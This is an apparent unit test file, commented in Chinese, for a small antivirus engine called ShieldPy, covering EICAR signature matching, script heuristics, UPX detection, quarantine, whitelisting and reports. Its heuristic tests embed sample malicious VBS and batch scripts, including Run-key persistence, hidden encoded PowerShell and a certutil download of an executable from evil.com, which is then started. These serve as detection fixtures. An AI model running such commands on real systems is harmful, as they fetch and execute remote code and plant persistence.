# -*- coding: utf-8 -*-
"""ShieldPy 核心单元测试。
用法: python -m unittest tests.test_core -v   （在项目根目录运行）
"""
import os
import shutil
import sys
import tempfile
import unittest
from pathlib import Path

BASE = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(BASE))

from core.config import config
from core.heuristics import detect_script_threat, detect_packer
from core.quarantine import quarantine, Quarantine
from core.scanner import engine, ThreatItem
from core.signature import signature_db, file_hashes
from core.whitelist import whitelist, Whitelist

EICAR_BYTES = b'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
EICAR_MD5 = "44d88612fea8a8f36de82e1278abb02f"
EICAR_SHA = "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"


class TestSignature(unittest.TestCase):
    def test_eicar_hash_known(self):
        md5, sha = file_hashes(Path(tempfile.gettempdir()) / "eicar_tmp.com") if False else (None, None)
        # 直接在内存计算
        import hashlib
        self.assertEqual(hashlib.md5(EICAR_BYTES).hexdigest(), EICAR_MD5)
        self.assertEqual(hashlib.sha256(EICAR_BYTES).hexdigest(), EICAR_SHA)

    def test_db_contains_eicar(self):
        rec = signature_db.lookup(md5=EICAR_MD5, sha256=EICAR_SHA)
        self.assertIsNotNone(rec)
        self.assertEqual(rec["type"], "test")


class TestHeuristics(unittest.TestCase):
    def test_vbs_malicious(self):
        text = ('Set ws = CreateObject("WScript.Shell")\n'
                'Set fso = CreateObject("Scripting.FileSystemObject")\n'
                'ws.Run "powershell -enc AAAA", 0\n'
                'fso.DeleteFile "C:\\evil.dll"\n'
                'ws.RegWrite "HKCU\\...\\Run\\m", "x"\n')
        name, desc, sev = detect_script_threat(None, text, ".vbs")
        self.assertIsNotNone(name)
        self.assertIn("Heuristic", name)
        self.assertEqual(sev, "high")

    def test_bat_dropper(self):
        text = ('@echo off\n'
                'reg add "HKCU\\...\\Run" /v up /d evil.exe /f\n'
                'schtasks /create /tn t /tr "powershell -w hidden -enc A" /sc onlogon\n'
                'certutil -urlcache -split -f http://evil.com/a.exe %TEMP%\\a.exe\n'
                'start %TEMP%\\a.exe\n')
        name, desc, sev = detect_script_threat(None, text, ".bat")
        self.assertIsNotNone(name)
        self.assertEqual(sev, "high")

    def test_clean_text_safe(self):
        text = 'print("hello world")\ntotal = sum(range(100))\n'
        name, desc, sev = detect_script_threat(None, text, ".py")
        self.assertIsNone(name)

    def test_normal_py_no_false_positive(self):
        # 正常 Python 脚本（常见 subprocess/import 用法）不应误报
        text = ('import os\n'
                'import subprocess\n'
                'def main():\n'
                '    r = subprocess.run(["dir"], shell=True)\n'
                '    print(r)\n'
                'if __name__ == "__main__":\n'
                '    main()\n')
        name, desc, sev = detect_script_threat(None, text, ".py")
        self.assertIsNone(name)

    def test_normal_bat_no_false_positive(self):
        # 正常维护批处理（删除临时文件/关机）不应误报
        text = ('@echo off\n'
                'echo 正在清理临时文件...\n'
                'del /f /q "%TEMP%\\*.tmp"\n'
                'shutdown /s /t 60\n')
        name, desc, sev = detect_script_threat(None, text, ".bat")
        self.assertIsNone(name)

    def test_packer_upx(self):
        head = b"MZ\x90\x00" + b"\x00" * 64 + b"UPX0" + b"\x00" * 32
        name, desc, sev = detect_packer(None, head)
        self.assertIsNotNone(name)
        self.assertEqual(name, "Packed.UPX")
        self.assertEqual(sev, "low")

    def test_packer_clean(self):
        head = b"MZ\x90\x00" + b"\x00" * 128
        name, desc, sev = detect_packer(None, head)
        self.assertIsNone(name)


class TestEngine(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="shieldpy_test_"))
        (self.tmp / "eicar.com").write_bytes(EICAR_BYTES)
        (self.tmp / "bad.vbs").write_text(
            'Set ws = CreateObject("WScript.Shell")\nws.Run "powershell -enc AAA", 0\n'
            'ws.RegWrite "HKCU\\...\\Run\\x", "y"\n', encoding="utf-8")
        (self.tmp / "ok.txt").write_text("just a note\n", encoding="utf-8")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_detect_eicar_and_vbs(self):
        hit_eicar = engine.scan_file(str(self.tmp / "eicar.com"))
        hit_vbs = engine.scan_file(str(self.tmp / "bad.vbs"))
        ok = engine.scan_file(str(self.tmp / "ok.txt"))
        self.assertIsNotNone(hit_eicar)
        self.assertEqual(hit_eicar.detection, "Signature.test")
        self.assertIsNotNone(hit_vbs)
        self.assertEqual(hit_vbs.detection, "Heuristic")
        self.assertIsNone(ok)

    def test_directory_scan(self):
        results = []
        engine.start_scan([str(self.tmp)])
        if engine._thread:
            engine._thread.join(timeout=30)
        threats = {os.path.basename(t.path) for t in engine.results}
        self.assertIn("eicar.com", threats)
        self.assertIn("bad.vbs", threats)
        self.assertNotIn("ok.txt", threats)


class TestQuarantine(unittest.TestCase):
    def setUp(self):
        self.base = Path(tempfile.mkdtemp(prefix="shieldpy_q_"))
        self.q = Quarantine(self.base)
        self.src = self.base / "evil.txt"
        self.src.write_text("bad content", encoding="utf-8")

    def tearDown(self):
        shutil.rmtree(self.base, ignore_errors=True)

    def test_quarantine_restore_delete(self):
        orig = str(self.src)
        ok, item = self.q.quarantine_file(orig, threat="Test.Threat", detection="Heuristic")
        self.assertTrue(ok)
        self.assertFalse(self.src.exists())       # 原文件已移走
        self.assertTrue(Path(item.quar_path).exists())  # 隔离副本存在

        ok, msg = self.q.restore(item.id)
        self.assertTrue(ok, msg)
        self.assertTrue(self.src.exists())        # 恢复成功
        self.assertFalse(Path(item.quar_path).exists())

        # 再次隔离并彻底删除
        ok, item = self.q.quarantine_file(orig, threat="Test.Threat", detection="Heuristic")
        ok2, _ = self.q.delete_forever(item.id)
        self.assertTrue(ok and ok2)
        self.assertFalse(Path(item.quar_path).exists())


class TestWhitelist(unittest.TestCase):
    def setUp(self):
        self.path = Path(tempfile.mkdtemp(prefix="shieldpy_wl_")) / "wl.json"
        self.wl = Whitelist(self.path)

    def test_add_contains_remove(self):
        ok, _ = self.wl.add("C:\\Users\\test\\file.exe", md5="abc123", reason="t")
        self.assertTrue(ok)
        self.assertTrue(self.wl.contains("c:\\users\\test\\file.exe"))
        self.assertFalse(self.wl.contains("C:\\Users\\test\\other.exe"))
        self.assertTrue(self.wl.remove("c:\\users\\test\\file.exe"))
        self.assertFalse(self.wl.contains("c:\\users\\test\\file.exe"))


class TestReport(unittest.TestCase):
    def test_generate(self):
        from core.report import generate_report
        import tempfile
        tmp = tempfile.mkdtemp(prefix="shieldpy_rpt_")
        # 临时改 REPORTS_DIR 不好，直接用真实目录（tests 会写 reports/）
        stats = {"scanned": 10, "threats": 1, "elapsed": 0.5}
        t = ThreatItem(path="C:\\x\\eicar.com", name="eicar.com", detection="Signature.test",
                       threat="EICAR", md5=EICAR_MD5, sha256=EICAR_SHA, size=68)
        html, txt = generate_report("quick", "C:\\", stats, [t])
        self.assertTrue(Path(html).exists())
        self.assertTrue(Path(txt).exists())
        content = Path(html).read_text(encoding="utf-8")
        self.assertIn("EICAR", content)
        self.assertIn("Signature.test", content)


if __name__ == "__main__":
    unittest.main(verbosity=2)
